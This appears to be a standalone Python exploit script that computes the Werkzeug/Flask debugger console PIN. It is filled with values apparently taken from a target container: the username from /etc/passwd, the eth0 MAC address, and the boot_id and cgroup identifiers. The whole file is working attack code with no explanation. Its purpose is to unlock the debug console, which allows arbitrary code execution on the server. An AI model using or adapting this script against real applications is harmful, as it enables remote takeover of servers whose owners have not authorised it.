import hashlib
from itertools import chain

probably_public_bits = [
    "root", # /etc/passwd
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    "33369149034070",  # MAC -> int /sys/class/net/eth0/address
    "8b3c68e1-aae6-4987-b257-c109d9973594cri-containerd-bf1b29a390bc2de5139b4bee6b9c4ac8e7c49766f85e3aac5ac63b107bcf1845.scope"
        # /proc/sys/kernel/random/boot_id + /proc/self/cgroup
        
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

rv = None
num = None

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x: x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)